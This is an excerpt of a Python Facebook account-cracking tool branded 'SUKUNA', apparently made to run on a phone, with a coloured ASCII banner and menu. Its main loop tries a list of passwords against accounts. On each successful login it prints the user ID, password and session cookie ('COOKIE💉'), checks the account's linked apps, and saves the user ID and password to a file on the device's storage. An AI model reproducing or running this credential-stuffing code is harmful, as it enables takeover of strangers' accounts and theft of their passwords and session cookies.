...
ha = current.day
today = date.today()
#SUKUNA 2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mSUKUNA ')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-SUKUNA /1.2.0 OPN-B'
...
def banner():
    clear()
    print(f"""\033[1;92m
\033[1;91m             _____ __  ____ ____  ___   _____ 
\033[1;91m           / ___// / / / //_/ / / / | / /   |
\033[38;5;208m   \__ \/ / / / ,< / / / /  |/ / /| |
\033[38;5;208m   ___/ / /_/ / /| / /_/ / /|  / ___ |  
\033[1;92m.       /____/\____/_/ |_\____/_/ |_/_/  |_|
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97m SUKUNA \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97m SUKUNA \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/profile.php?id=61550767467929')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio SUKUNA _OK.mp3")
                print('\033[1;92m[SUKUNA -OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/SUKUNA -OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mSUKUNA ","\x1b[1;92mSUKUNA ","\x1b[1;93mSUKUNA ","\x1b[1;94mSUKUNA ","\x1b[1;95mSUKUNA ","\x1b[1;96mSUKUNA ","\x1b[1;97mSUKUNA ","\x1b[1;91mSUKUNA ","\x1b[1;92mSUKUNA ","\x1b[1;93mSUKUNA ","\x1b[1;94mSUKUNA ","\x1b[1;95mSUKUNA ","\x1b[1;96mSUKUNA "])
